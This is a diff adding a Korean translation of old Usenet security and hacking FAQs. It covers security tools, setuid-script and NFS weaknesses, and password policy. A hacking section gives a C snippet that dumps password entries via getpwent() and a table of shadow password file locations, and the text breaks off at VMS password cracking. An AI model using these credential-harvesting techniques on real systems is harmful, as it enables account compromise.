@@ -1,0 +1,2748 @@
+﻿
+
+
+* 보안에 대한 주요 FAQ
+
+1.alt.security 와 comp.security.misc는 어떤곳인가?
+comp.security.misc는 유닉스와 관련된 컴퓨터 보안을 토론하는 포럼이다.
+alt.security도 마찬가지로  같은 주제를 다루지만,자동차의  잠금장치나 경보장치
+까지도 다루고있다.
+
+2.해커 와 크래커 의 차이는 무엇인가?
+USENET에 의하면,크래커(cracker)는 여러가지 이유로 다른 사람의 시스템에 침
+투하려는 사람들을 지칭한다. 그들은 단지  '가능하니까'라는 핑계를 대며 자신들
+의 행위를 정당화시키지만,대부분은 불법적인  일을 저지름으로써 명성을 얻으려
+고 할뿐이다.
+특히 반사회적인 크래커는 문화예술을  파괴하려는 경향을 가지고있어서, 파일시
+스템을 삭제하고,시스템을 파괴하고,그들의  흔적을 추적하는 프로그램을 마비시
+킨다.pc 의 복제장치를  제거해서 불법복사본을 배포하는 사람을  가리키는 경우
+에도 크래커라는 말이 널리 쓰인다.
+USENET에 의하면,  HACKER는 컴퓨터에 관한 상당한  양의 지식과 전문적인
+기술을 갖고  있으며,교묘하게 이러한 기술을 이용할  수 있는 사람들을 말한다.
+실제로, 사람들은 해커라는 말을 크래커와 거의 같은 의미로쓰고있다.
+usenet에서도 이러한 경우는 심심치않게 나타나서 사람들을 혼란시키고 있다. 보
+안을 다루는 게시판에 크래커를 해커로 잘못 사용한 게시물을 올린다면 많은 비
+난을 면치 못할 것이다.
+
+3.'security through abscurity'란 무엇인가?
+STO(불투명함에 의한  보안)는 사용자그룹의 외부에  있는 어느 누구라도 내부
+메카니즘에 대하여  아무것도 발견할 수  없는 한, 시스템이  안전하다는 믿음을
+말한다. "누구라도 영원히 발견하지 못할 것이다"라는 가정을 가지고,password를
+이진파일에 숨기는 것은 STO의 대표적 예이다.
+STO는  많은   관료주의자들(군인,공무원....)이  좋아하는  철학이며,   시스템에
+'pseudosecurity'를 제공하는 중요한 한 방법이다. 개방화된 시스템, 네트워킹, 프
+로그램 기술에 대한 이해의 증가, 그리고 일반인이  사용할 수 있는 강력한 컴퓨
+터의 등장으로 인하여 STO의 유용함은 점점 약해졌다.
+STO의 기본은 '알 필요'에 의해서 시스템을 사용하는 것이다. 어떤  사람이 시스
+템 보안에 영향을 미치는 방법을 모른다면 그것은 위험하지 않다.
+모두가 인정하듯이, STO는 믿을 만한 이론을 가지고 있지만, 어쩔 수 없는 예외
+의 경우도 있다. 그것은 바로 시스템의 운영자들로, 만일 유능한 직원이 더 나은
+보수를 받고 다른 직장으로 간다면, 그가 알고 있는 지식도 함께 가버린다. 일단
+그런 비밀이 노출되면 시스템의 보안도 더 이상 안전하지 않다.
+최근에는 평범한 사용자들도 시스템이  돌아가는 방법에 대하여 자세하게 알 필
+요가 있으므로 그 결과  STO의 효과는 많이 약해졌다. 오늘날 많은  사용자들이
+전에는 알 필요가 없었던 시스템에  대해 상당히 많은 지식을 가지게 되었기 대
+문에, 보안에 상당히 많은 문제가 생기기 시작했다.
+따라서 지금 필요한 것은  철학적으로 안전하기 보다는 실제적으로 안전한 시스
+템(Kerberos,Secure RPC)을 만드는 것이다.
+'Shadow Passwords'는 종종 STO와 같이 무시당하지만, 이것은 옳지 않다.
+왜냐하면 STO는 알고리즘이나 테크닉에  대한 접근을 제한하지만 쉐도우패스워
+드는 실질적인 자료에 대한 접근을 제한하기 때문이다.
+
+4.시스템의 보안을 저해하는 요소는 무엇인가?
+진정으로 안전한 시스템은  파워를 끄고 코드를 뺀  후에 티타늄 선으로 묶어서
+콘크리트로 밀봉을 하고 독가스를  채워서 최신의 무기를 가진 경비원으로 보호
+를 하는 것이다.  그러나 그렇다고 하더라도 누구도 거기에 자신의  생명을 걸만
+큼 안전하다고 자신하지는 못한다.
+시스템의 보안 여부는  그것을 사용하는 사람들에게 달려있다.  시스템을 사용하
+는 모든 사람들이 자기들의 시스템을 아무 문제 없이 이용하기 위해서 나름대로
+책임감을 갖고 임한다면  특별한 보호장치 없이도 안전하게  유지될것이다. 많은
+실험실에 있는 PC들은 이런 방식으로 아주 잘 운용되고 있다.
+문제는 보안 유지에  대한 필요성을 느끼면서 시작된다. 일단 시스템에  보안 장
+치를 설치하고 나면,그것은 결코 끝나지 않는 전쟁이 될 것이다.
+보안상의 허점은 다음과 같이 4가지의 종류로 나눌 수 있다.
+(1) 물리적 허점
+불법 사용자가 시스템에 물리적으로  접근함으로써 문제가 생기는데,그가 해서는
+안되는 작업을 할 수도 있기 때문이다.
+이러한 좋은 예는 공동으로 사용하는 워크스테이션실에서  일어날 수 있는데, 그
+런곳에서는 사용자가  손쉽게 시스템을 단일사용자모드로  바꾸고,파일 시스템을
+뒤섞어 버릴 수 있다. 따라서 사전에 충분한 주의가 필요할 것이다.
+또 다른  예로서,누구나 쉽게 읽을 수  있는 백업장치의 경우 기밀  유지를 위해
+접근을 제한할 필요가 있다.
+(2)소프트웨어 상의 허점
+특별한 권한을 가지는 프로그램들(daemons,cronjobs)의 경우,이들이 원래의 목적
+과 다르게 이용될 가능성이 있다.
+가장 유명한 예가 sendmail  debug에 있던 허점인데, 크래커가 이것을 이용하여
+root로 빠져나가는 좋은  수단이 되었다. 이것은 파일  시스템을 삭제하고,새로운
+계정을 만들고, 패스워드 화일을 복제하는 등의 작업에  사용되었다.(일반적인 생
+각과는 다르게,sendmail을 통한  침투는 악명높은 INTERNET WORM만  할 수
+있었던 것은  아니었다. 크래커라면 누구든지  telnet을 이용하여 상대  시스템의
+port25을 통해서 침투할 수 있었다)
+이런 새로운 허점은 항상 발견될 수 있으므로 늘 다음과 같이 대비해야 한다.
+ * root/daemons/bin에는 가급적 최소한의  프로그램을 설치하도록 한다. 이곳에
+   있는 프로그램들은 특별한 권한을  가지고 있어서 위험하게 쓰일 수 있기 때
+   문이다.
+ * 문제의 해결책을  제공받을 수 있는 곳들에 대해 mailing  list를 만들어 문제
+   가 발생할 경우 즉각적으로 연락을  취해 그 문제에 대한 정보를 받을 수 있
+   도록 해야한다.
+(3)호환성의 문제
+누구의 잘못은 아니지만,시스템  운영자가 경험이 부족해서 보안의  측면에서 문
+제가 있는 하드웨어 와 소프트웨어를 시스템에  설치한 경우이다. 이와같은 문제
+는 시스템이 일단 가동되고 나면 발견하기가  힘들다. 따라서 신중하게 고려하여
+시스템을 구성해야 한다.
+(4) 적당한 보안정책의 작성과 유자
+네번째 보안 문제는 인식과 이해에 관한 것이다. 완벽한 프로그램,보호장치가
+된 하드웨어, 그리고 호환적인 부품일지라도, 적잘한 보안 정책을 가지고 운영되
+지 않는다면 제  역할을 하지 못할 것이다. 만약 사용자들이  자신의 사용자명을
+거꾸로 해서 패스워드를 정해버리는  식으로 보안 개념이 희박하다면 아무리 좋
+은 패스워드 방식일지라도 아무런 가치가 없다.  보안이라는 것은 그러한 정책에
+맞추어서 시스템을 얼마나 잘 운영하는가에 달려있다.
+
+5.보안을 도와주는 도구에는 어떤 것들이 있는가?
+(1)'COPS'
+Dan Farmer에 의해 개발된 이 프로그램은 보안 상태를 검사해주는 기능을 하는
+shell script이다. 기초적인 password cracker,setuid 프로그램에서 의심스런 변화
+를 알아보기  위해 파일시스템을  검사하는 기능,기본  시스템과 사용자  파일의
+permission을 검사하는 기능,문제를 일으킬만한  행동을 하는 시스템 프로그램을
+검사하는 등의 기능을 가지고있다.
+(2)'CRACK'(+'UFC')
+Alec Muffett에 의해 개발된 이  프로그램은,외부인에 쉽게 노출될 가능성이있는
+패스워드를 찾아내는  기능을 가지고있다.  아마도 이것은 패스워드  크래커로서
+대중에 배포되는 유일한 프로그램으로서,사용자가  자신이 원하는 패스워드를 정
+확하게 설정할 수 있도록 도와준다.
+이것은 네트워크상에서 가급적 많은 시스템에서 사용 가능하도록 네트워크 기능
+이 내장되어 있으며,Unix crypt() 알고리즘의 최적화된 버전으로 제공된다.
+crypt()알고리즘 의 훨씬 더  빠른 버전인 'UFC'는 Michael Glad에 의해 개발되
+었으며 네트워크상에서  무료로 배포된다. UFC와 CRACK  의 최신버전은 서로
+호환이 되므로 함께 사용이 가능하다.
+(3)NPasswd(Clyde Hoover) & Passwd+(Matt Bishop)
+이 프로그램은 패스워드 크래킹 전쟁에서 균형을 되찾기 위하여 작성되었다.
+이들은 표준  'passwd'명령어를 교체하여 사용자가 CRACK같은  프로그램에 의
+해 쉽게 노출될 수 있는 패스워드를 정하지 못하도록 하는 기능을 가지고있다.
+System V,NIS/yp,shadow password schemes  등의 다양한 시스템에서 쓰일 수
+있는 여러가지 버전이  나와 있다. 일반적으로 파시스트  패스워드 프로그램으로
+불리운다.
+(4)"SHADOW"-Shadow Password suite
+John F Haugh II 가  개발한 이 프로그램은 쉐도우패스워드 를 이용할 수 있도
+록 해주는 프로그램이다. 즉 root 이외에는 어느 누구도 패스워드 파일을 볼수가
+없으며, 패스워드 크래킹으로부터 안전하게 시스템을 보호해준다. 파시스트 패스
+워드와 함께 쓰인다면 상당히 좋은 보안 방식이 될 것이다.
+(5)TCP Wrappers(Wietse Venema)
+유닉스가 기본적으로 제공하는  많은 네트워크 서비스에 front-ent  filter를 제공
+하는 프로그램이다.  설치되고 나면,FTP/TFTP,telnet등을  이용하여 불법적으로
+이루어지는 접속을 막을  수 있다. 누군가 시스템에 침투하려고 하는  경우에 유
+용하게 쓰일 수 있다.
+(6)SecureLib
+Securelib은 kernel에 들어있는 세가지 함수들에 대한 대체 함수를 가지고있다.
+(accept(),recvfrom(),recvmsg())이것들은 기존의 함수들과 호환성을 가지고  있으
+며,시스템의 인터넷 어드레스를  검사하여 접속이 가능한 시스템을  확인하는 기
+능을 가지고있다. 접속이 가능한 host는 configuration file에 기록된다.
+(7)SPI
+SPI는 file integrity를 포함하여 configuration option을 검사하는 프로그램이다.
+차후에는 COPS에 포함될 예정이다.이것은 일반인은  사용할 수 없고, 미국 정부
+만이 사용할 수 있다.
+
+6.cracking tools을 일반인에게 공개하는 것이 위험하지 않은가?
+개인의 견해에 따라 다르다. 일부사람들은 COPS와 CRACK을 공개한 것이 무책
+임한 일이라고 주장한다. 부당하게 이용될 수 있기 때문이다.
+그러나 역으로 생각하면, 이 프로그램이 갖는 긍정적인 면도 무시할 수 없다.
+일반인들이 이 프로그램들을 이용해서 자신의 시스템을 검사하는데 많은 도움이
+되기 때문이다. 따라서  공개로 인한 효과가 긍정적인지,부정적인지는 확실치 않
+다.
+
+7.이러한 프로그램은 어디서 구할 수 있는가?
+(1) COPS
+v 1.04,cert.sei.cmu.edu(pub/cops)와  archive.cis.ohio-state.edu(pub/cops)에서 ftp
+를 이용하면 가능하다.
+(2) CRACK/UFC
+Crack  v4.1f, UFC  oatchlevel 1.  comp.sources.misc의 volume  28에서 주요한
+USENET archive 를 통해 쉽게 구할수 있다.
+(3) NPasswd
+현재 많은 해킹버전이 존재한다. 버전  2.0이 준비중이며, 여러장소에서 여러버전
+을 구할 수 있다.
+(4)Passwd+
+'alpha version,update 3' - beta version이 곧 나올 예정이다.
+dartmouth.edu의 pub/passwd+.tae.Z 파일로 구할 수 있다.
+(5)SHADOW
+Usenet archive에 있는 comp.source.misc 디렉토리에서 구할 수 있다.
+(6) TCP wrappers
+anomymous FTP를 이용하면 가능하다.
+cert.sei.cmu.edu:pub/network_tools/tcp_wrapper.shar
+ftp.win.tue.nl:pub/security/log_tcp.shar.Z
+(7)Securelib
+eecs.nwu.edu 에서 anonymous FTP를 이용하면 구할 수있다.
+pub/securelib.tar로 저장되어 있다.
+
+8.시스템이 침입을 당하는 이유는 무엇이고 어떻게 침입을 당하는가?
+이것은 단정적으로 대답하기  힘든 문제이다. 크래커가 많은  시스템에 침투함으
+로써 얻는 것은  침투했다는 기록뿐이다. 크래커는 새로운  시스템으로 침투하기
+전에 여러 단계를 거치는 방식으로 자신의 흔적을 없앰으로써 추적을 어렵게 만
+든다. 가능한 많은  시스템을 침투하여 얻는 장점은 접속 세탁이  훨씬 용이해진
+다는 사실이다.
+또다른 이유는 심리학적인  것으로,컴퓨터를 다루는 것을 좋아하는  일부 사람들
+은 많은 시스템을 침투함으로써 자신의 실력을  확인하고 싶어하는 것이다. 그들
+은 NASA,AT&T,UCB 와  같은 거대 조직에 침투하기  위하여,6개의 인터넷 기
+계,2개의 gateways 그리고 X.25  network를 거쳐서 이동하는 것을 '아주 매끄럽
+다'고 생각한다. 그것을 인터넷 관광이라고 생각하는 것 같다.
+이러한 생각은 크래커에게는  충분히 매력적인 것으로 받아들여지고  있으며, 크
+래킹에 한번 물들면 좀처럼 빠져나오기 힘들게 되는 것이다.
+'어떻게'에 관한 대답은 피상적인 영역이다.  대학에서는 대학원생들 사이에 자기
+ID를 빌려주는 것이 굉장히 보편적이다. 가령 다음의 예를 보자.
+'A가 다른 site에 있는 남자친구 B에게 자신의  ID를 빌려주었는데,B에게는 네트
+워크를 이리저리 기웃거리기를 좋아하는  C라는 친구가 있었다. C는 A의 site에
+서 크래킹이 가능한 여러 ID를 찾아내고,그것들을 주위의  친구들에게 알려 주었
+다. 얼마 지나지  않아, A가 사용하는 시스템에는  C를 비롯한 수많은 해커들이
+술마시며 노래하면서 놀고 있었다.'
+이런 종류의 일은 대학뿐 아니라 어디서나 쉽게 벌어지는 일이다.
+이것을 해결하는  방법은 교육을 하는  것이다. 사용자들이 다음과  같은 태도를
+가지지 못하도록 해야 한다.
+'나는 내가 사용하는 계정에서 어떤 패스워드를 사용하든지 신경쓰지 않는다.
+결국 나는 레이저를 이용하여 프린트를 하기 위해 네트워크를 이용할 뿐이다'
+컴퓨터의 사용이 자신이 속한  그룹에게 얼마나 중요한 책임이 있는가를 가르쳐
+야 한다.
+
+9.침투를 당하면 어떻게 해야 하는가?
+인터넷에 물려있다면, CERT에 연락하라.
+CERT는 1988년에 defense advanced research projects agency(DARPA)에 의해
+구성되었으며, 인터넷 사용자들이 겪는 보안 문제에  관해 돕는것을 목적으로 한
+다.
+CERT의 본부는 software engineering,carnegie mellon univ.,pittsburgh,PA에  위
+치해 있다.
+
+10.'firewall'(방화벽)이 무엇인가?
+인터넷 firewall은 당신의 사이트와 인터넷 중간에 있는 machine으로,네트워크의
+소통상황을 조절하며 인터넷 port에  대한 접속을 제한한다. 비슷한 시스템이 다
+른 네트워크 타입에도 가능하다.
+
+11.왜 setuid shell scripts를 사용할 수 없는가?
+여러기지 이유로 사용해서는 안되는데, 대개는 유닉스  커널에 있는 버그와 관련
+되어 있다. 여기에 몇가지 잘 알려진 문제가 나오는데, 이들은 최근에 와서야 수
+정되었다.
+(1)script가 "#!/bin/sh"로 시작하고, link(symbolic이든 다른것이든)rk "-i"와 함게
+만들어질 수 있다면,script를 실행할 수  있으므로 setuid shell로 바로 들어갈 수
+있다. "#!/bin/sh -i",즉 interactive shell이다.
+(2)명령어 처리가 시작되는 시점과 그리고 새롭게  setuid를 설정하는 exec()ed가
+진행되는 시점 사이에서  어느 셀스크립트를 당신이 선택,실행가능한  것으로 바
+꾸어주는가 하는 상황이  많은 커널들에게 피해를 입힌다.  계속해서 집중적으로
+파고든다면 이론상으로는,누구든지  실행시키기를 원하는 프로그램의  커널을 얻
+을 수 있다
+(3)IFS의 버그 : IFS변수는 명령어들을 처리할 때  셀에 의해서 공백으로 처리되
+는 문자들의  표를 가지고있다. '/'문자를  가지는 IFS변수를 바꾸어 'bin/true'를
+'bin true'로 바꿀 수 있다.
+만일 원하는 것이 변경된 IFS변수를 빼내는 것이라면 'bin'명령을 당신의 경로에
+설치하고 'bin/true'라는 setuid 스크립트를 실행하면 된다.
+정말로 스크립트를 이용하여 setuid를 설정하려면 다음의 두가지 방법이 있다.
+a)스크립트가 실행되기 전에  IFS와 PATH를 리셋시키지 않도록 주의하며 스크
+립트 주변의 'C'에  setuid를 집어넣는다. 만일 시스템이  라이브러리와 링크시키
+기 시작한다면 LD_LIBRARY_PATH의 설정값을 생각해 보는것이 좋다.
+b)안전한 setuid의  설정의 용이성을 가지고 있으며  보안에 매우 강한  perl같은
+스크립트 언어를 사용하라.
+그러나 진짜로 안전한 것은 아예 setuid 스크립트를 사용하지 않는것이다.
+
+12.console로 접속한 'root'를 영원히 빠져나올수 없는가?
+console로 'smart' 터미날을 사용하고,'root'로  접속한 상태에서 '/dev/console'을
+쓰기  가능하게 만드는  것은  잠재적인  결점을 가지고있다.  터미널은  escape
+sequence를 통해서 원격제어하는  것에 다소 취약점을 가지고  있고,root shell로
+무엇인가를 입력하는 것이  가능하다. 터미널 유형은 'ps'명령을 이용하면 알  수
+있다.
+이것에 대한 다양한 해결책을 모색해 볼 수 있는데,일반적으로는 console 소유자
+와 group-write에게만 엑세스 권한을  주고,그런 다음 console에 출력을 보낼 필
+요가 있는 프로그램에서 setgid 메카니즘을 이용하는 것이다.
+
+13.null password를 가지는 unix 계정을 만들수 없는가?
+임의로 사용하기 위하여 패스워드가 없는 계정을 만드는것은 상당히 위험하다.
+특별한 이유가 있어서라기보다는 크래커가  이용할 수 있는 거점을 제공할 수있
+기 때문이다.
+예를들어,누군가가 패스워드가 없는 계정인 'sync'를 찾아내고 login 과정없이 디
+스크를 사용하게 되었다고 가정하자. 이것은 안전하고  위험해 보이지 않을 수도
+있다.
+그러나 당신의 시스템이 FTP에  접속하기 전에 사용자를 검사하지 않는 시스템
+중의 하나라면  문제가 발생할 수  있다. 크래커는 다양한 FTP방법을  이용하여
+접속을 하고, 패스워드가 없는 계정  'sync'를 이용해서, 패스워드 파일을 복사해
+가 수 있다.
+유닉스의 최신버전은 이런 종류의 사건을 미리  방지하는 기능을 갖고 있지만,완
+전하게 안전한 시스템을 위해서는 시스템의 모든 프로그램과 사용자확인법 등에
+관해서 깊이 있는 지식을 가지고있어야 한다.
+null-password가  갖고있는   또  다른   문제점은,자신의  라이브러리에   있는
+LD_LIBRARY_PATH 변수를 바꿔서 'login -p'또는 'su'를 실행시킴으로써 자신
+의 프로그램을 'sync'가  사용한 것처럼 시스템 프로그램을 속일  가능성이 있다
+는 것이다.
+
+14.x-windows와 관련된 보안상의 허점은 어떤것이 있는가?
+일부는 X에만, 어떤 것들은 시스템 전체의 보안에 영향을 미치기도 한다.
+여기서는 자세히 다루지 않겠으니 다른 참고서적을 보기바란다.
+한가지 지적하고 싶은  것은 X는 'incompatible usage'보안에  문제를 가지고 있
+는 프로그램이라는 것이다.  예를들어 크래커는 패스워드가 없는  계정을 이용하
+여 호스트에 있는 xsession을 실행할 가능성이 있다.
+
+15.NFS에는 어떤 허점이 있는가?
+NFS의 보안은 서버가 만들어내는 파일을 설치하는 사람에게 크게 의존한다.
+호스트가 만들어낸 디렉토리를 설치하기  위하여 정확한 포맷을 정하는 것은 유
+닉스의 종류에 따라  다양하지만, 일반적으로는 그 정보는 화일  '/etc/exports'에
+저장된다. 이 화일은 많은 디렉토리를 가지고 있으며,각각은 NFS가 그 디렉토리
+로 mount할 수 있는 특정한  호스트 또는 넷그룹의 목록을 가지고 있다. 이목록
+은 'access list'라고 불린다.
+'hosts'는 개별적인 시스템이지만,'netgroups'는  '/etc/netgroup'에 명시되어 있는
+hosts 와 username의 조합이다. 이것들은 finetuning access의 한 방법을 제공할
+목적으로 만들어진 것이다.
+이러한 화일들은 읽기 전용,읽기-쓰기 가능,그리고 슈퍼유저가 접근할 수 있는가
+에 대한 정보들을 포함하고 있다. 중요하게  기억해야 할 점은 /etc/exports에 있
+는 특정한 디렉토리를 acess list 가 포함하고 있는가에 대한 여부이다.
+(1)<nothing>
+디렉토리는 어디에 있는 누구든지 mount할 수 있다.
+(2)<a specific hostname>
+디렉토리는 허가된 사람만이 mount할 수 있다. 이것은 신뢰할 만한 사람을 의미
+하는 것은 아니다. 예를들어 NFS가 PC에서 돌아가는 상황이라면 어느 누구든지
+mount 할 수 있다.
+(3)<a netgroup name>
+netgroup이,
+a)빈칸이라면 어디에 있는 누구든지 마운트할수 있다.
+b)'(,,)'을 포함하고 있다면,어디에 있는 누구나 마운트할수 있다.
+c)빈칸이거나 '(,,)'으로 기록된 netgroup을 가지고 있다면,어디에 있는 누구나
+ 마운트 할수있다.
+d)'(hostname,,)'라고 적혀있으면, 이 호스트의 사용자만이 마운트할수있다.
+e)(,username,)'라고 적혀있으면, 이 사용자는 어디서든지 마운트할수있다.
+(4)<hostname 이나 netgroup이 아닌 단어일 경우>
+만약 host name인  'athena'를 'ahtena'로 잘못 입력했을 경우,  이것은 netgroup
+name으로 받아들여진다. 이와 같은  netgroup은 존재하지 않으므로 빈칸으로 인
+식된다. 따라서 어디에 있는 누구든지 마운트할수있다.
+따라서 /etc/exports 와 /etc/netgroup 에 집어넣을 내용에 대해서 충분히 주의를
+기울이지 않는다면,pc를 가지고있는 사용자들은 다음과 같은 행동을 할 수 있다.
+a)server의 화일시스템을 자신의 디스크에 복사할 수 있다.
+b)/etc/passwd,.rhosts,/etc/hosts.equiv를 편집할 수 있다.
+c)또 다른 사용자,아마도 'root'로 접속할 가능성이 있다.
+위의 정보는 NFS에 따라  달라질 수 있지만,보통 NFS에서는 모두 적용이  되었
+다.'EMPTY' netgroup을 만드는 가장 좋은 방법은 다음과 같다.
+ngname(-,-.,-)
+이것은 no-one,no-host,no-NIS-domain을 의미한다.
+
+16.안전한 패스워드를 만드는 방법은 무엇인가?
+방법은없다. '만든다'라는 말이 중요한 의미를 가진다. 일단 패스워드를 만들어내
+는 알고리즘이 시스템에서 구성되면, 이 패스워드를  알아내기 위해서는 이 알고
+리즘만 분석해내면 된다. 알고리즘을 복잡하게 만들지  않는다면 쉽게 분석이 될
+것이다.
+a)크래커는 모든 사용자의 패스워드에 대해 password generator가 만들어 낼 수
+있는 모든 경우를 대입해본다.
+b)패스워드 알고리즘을 분석해서 다른 사용자의 패스워드에 적용시켜본다.
+패스워드를 제대로 만들려면 다음과 같이 해서는 안된다.
+자신의 이름이나 이름+머릿글자의  일부만 바꾼다,사전에 있는 단어를 사용한다,
+머릿글자,생활과 관련되어 쉽게 추측이 가능한단어......
+
+17.PASSWORD는 그렇게 중요한가?
+최전선에서 침투를 막아내는 역할을 하므로 매우 중요하다. 크래커가 시스템에
+접근할 수 없다면,패스워드 파일을 쓰거나 읽을 수  없으며 그 외의 다른 방법도
+존재할 수 없다.
+그가 최소한 패스워드 파일을 읽을 수 없다면 그 안에 있는 어떤 패스워드도 알
+아낼 수 없다. 그러나  그가 패스워드 화일을 읽을 수가 있다면,시스템의 허점을
+이용해서 root의 패스워드 마져 알아낼 가능성이 있다.
+
+18.PASSWORD의 조합이 가능한 개수는 얼마나 되는가?
+대부분의 사람들은 CRACK같은  프로그램들이, 패스워드에 쓰인느 가능한  모든
+문자를 이용하여 검색을 할 수 있을 만큼 발전할 것이라고 걱정하고 있다.
+간단하게 다음처럼 가정을 해서 계산을해보자
+(1)62개의 문자를 이용해서 패스워드를 만든다.(A-Za-z0-9)
+(2)5개부터 8개의 문자로 패스워드를 만든다.
+그렇다면 가능한 패스워드의 크기는 다음과 같다(62개의 문자를 이용)
+
+             100000 +
+            1000000 +
+           10000000 +
+          100000000 =
+       ------------
+          111100000
+
+현재의 기술을 이용하면 위의 문자열을 검색하는 것은 그리 어렵지 않다.
+그러나 패스워드에는 이 외에도 다양한 문자들이 사용된다는 것을 잊지 말아라.
+<space>,모든 구두점, 기호(~<>|\$%^&*). 만약 95개의 비제어 문자를  패스워드
+에 사용할 수 있다면, 크래커가 이 모두를 검색하는 것은 쉽지않다.
+그러나 아직도 크래커가 시스템에 침투할 가능성은 여전히 존재한다.
+너무 걱정할 것은 없다. 강력한 패스워드  화일을 만들어서 시스템을 보호한다면
+크래커도 쉽게 침투하지 못할 것이기 때문이다.
+
+19.아직도 인터넷 WORM이 침입가능한 시스템이 있는가?
+대부분의 경우 유닉스  프로그램의 버그가 수정되어 지금은  worm이 침입할 수
+있는 시스템이 많지 않다.
+그러나 아직도 분명히 침입 가능한 시스템이 존재한다.
+
+
+
+* 해킹테크닉에 대한 주요 FAQ 모음 *
+
+1.어떻게 유닉스 패스워드 화일에 접근할 수 있는가?
+표준 유닉스에서는 password file 이 /etc/passwd이다.
+NIS/yp 또는 password shadowing을  이용하는 유닉스 시스템에서는 패스워드화일이 다를 수 있
+다.
+
+2.어떻게 유닉스 패스워드를 깨뜨리나?
+일반적으로 유닉스 패스워드는 특수한 함수로 암호화가되어 있어 해독이 상당히 어렵다. login 프
+로그램은 password:에서 입력한 문자들을 암호화하며,이렇게 암호화된 문자열은  유닉스에 저장되
+어 있는 기존의 암호화된 문자열과 비교가 된다. 이렇게  암호화된 문자열이 무엇인가를 알아내기
+위해서 단어표를 이용하는  방법이 있다. 단어 표에  있는 각각의 단어는 암호화되고  해석하고자
+하는 패스워드의 암호화 형태와 비교된다.
+유닉스  패스워드를  알아내는  가장  좋은  프로그램은  현재  alec  muffet이 만든  CRACK이
+며,PC-DOS에서는 현재 CRACKERJACK이 많이 쓰이고있다.
+
+3.패스워드 쉐도윙(암호 숨기기)는 무엇인가?
+Password shadowing 은 보안 체계를 지칭하는 것으로,패스워드 쉐도윙을 이용하면,
+/etc/passwd에 들어 있는 각각의  패스워드는 특별한 기호로 바뀌어지며,바뀌어진 패스워드는 일
+반 사용자가 읽을 수 없는 파일로 분리되어 저장된다. 일반적인 시스템에서 패스워드쉐도윙에 있
+는 패스워드 화일을 알아내기 위해서는  getpwent() 를 계속해서 호출하는 아래의 프로그램을 이
+용한다.
+예:
+
+#include <pwd.h>
+main()
+{
+struct passwd *p;
+while(p=getpwent())
+printf("%s:%s:%d:%d:%s:%s:%s\n", p->pw_name, p->pw_passwd,
+p->pw_uid, p->pw_gid, p->pw_gecos, p->pw_dir, p->pw_shell);
+}
+
+4.쉐도윙으로 만들어진 패스워드 화일은 어디에 위치하는가?
+Unix                  Path                            Token
+-----------------------------------------------------------------
+AIX 3                 /etc/security/passwd            !
+       or             /tcb/auth/files/<first letter   #
+                            of username>/<username>
+A/UX 3.0s             /tcb/files/auth/?/*
+BSD4.3-Reno           /etc/master.passwd              *
+ConvexOS 10           /etc/shadpw                     *
+ConvexOS 11           /etc/shadow                     *
+DG/UX                 /etc/tcb/aa/user/               *
+EP/IX                 /etc/shadow                     x
+HP-UX                 /.secure/etc/passwd             *
+IRIX 5                /etc/shadow                     x
+Linux 1.1             /etc/shadow                     *
+OSF/1                 /etc/passwd[.dir|.pag]          *
+SCO Unix #.2.x        /tcb/auth/files/<first letter   *
+                            of username>/<username>
+SunOS4.1+c2           /etc/security/passwd.adjunct    ##username
+SunOS 5.0             /etc/shadow
+                      <optional NIS+ private secure maps/tables/whatever>
+System V Release 4.0  /etc/shadow                     x
+System V Release 4.2  /etc/security/* database
+Ultrix 4              /etc/auth[.dir|.pag]            *
+UNICOS                /etc/udb                        *
+
+5.NIS/yp는 무엇인가?
+전에는  yp (Yellow Pages)라고 알려졌던  NIS (Network Information System) 의 주 목적은 패스
+워드자료와 같이 네트워크를 구성하는 여러 CONFIGURATION DATE를 다양한 시스템이 공유할 수 있
+도록 하기 위해  만들어졌다. 그러나 단지 시스템의 보안을  증가시킬 목적으로 만들어진 것만은
+아니다. NIS를 이용하면 /etc/passwd 파일은  다음처럼 아주 간단해진다. 이 파일의 내용을 보려
+면 ypcat passwd라는 명령어를 이용한다.
+
++::0:0:::
+
+6.'ypcat passwd'에서 콤마뒤에 나오는 기묘한 문자는 무엇인가?
+그 문자는 password aging data라고  불리며,시스템 관리자가 정한 기간이 지나면 사용자가 패스
+워드를 변경하게 하는 역할을 한다.
+
+]
+] 다음은 'password aging data'가 들어있는 /etc/passwd 파일의 예이다.
+]
+] will:5fg63fhD3d,M.z8:9406:12:Will Spencer:/home/fsg/will:/bin/bash
+]
+암호화가 된 패스워드에서 콤마뒤에 나오는 문자는 password aging mechanism을 따른다.
+]
+] 위 예에서 Password aging characters는 다음과 같다.
+]
+] M.z8
+]
+
+4개의 문자는 다음과 같이 해석된다.
+1  패스워드가 변경되지 않고 사용될 수 있는 최대기간(주 단위)
+2  패스워드가 변경되기 전에 사용해야만 하는 최소 기간(주 단위)
+3,4 세가지 특별한 경우가 존재한다.
+
+첫번째와 구번째 문자가 '..'인 경우,사용자는 다음번  login에서 패스워드를 변경해야 한다. 그러면
+패스워드 프로그램은 password  aging characters를 제거하므로 차후에는  패스워드를 꼭 변경할
+필요는 없다. 세번째와 네번째 문자가 '..'인 경우도  마찬가지로 사용자는 패스워드를 변경해야 한
+다. password aging은 첫번째와 두번째 문자에 정의된 대로 이루어진다. 첫번째 문자(MAX)가 두
+번째 문자(MIN)보다 값이 작을  경우는 사용자는 그의 패스워드를 변경할 수 없으며,root만이 바
+꿀 수 있다.
+
+                        Password Aging Codes
++------------------------------------------------------------------------+
+|                                                                        |
+| Character:  .  /  0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  G  H |
+|    Number:  0  1  2  3  4  5  6  7  8  9 10 11 12 13 14 15 16 17 18 19 |
+|                                                                        |
+| Character:  I  J  K  L  M  N  O  P  Q  R  S  T  U  V  W  X  Y  Z  a  b |
+|    Number: 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 |
+|                                                                        |
+| Character:  c  d  e  f  g  h  i  j  k  l  m  n  o  p  q  r  s  t  u  v |
+|    Number: 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 |
+|                                                                        |
+| Character:  w  x  y  z                                                 |
+|    Number: 60 61 62 63                                                 |
+|                                                                        |
++------------------------------------------------------------------------+
+
+7.VMS에서 패스워드 화일에 어떻게 접근할 수 있는가?
+VMS에서 패스워드 파일은  SYS$SYSTEM:SYSUAF.DAT 이며,유닉스와 달리 일반  사용자는 이 파일을
+읽을 수 없다.
+
+8.VMS 패스워드를 어떻게 깰 수 있는가?
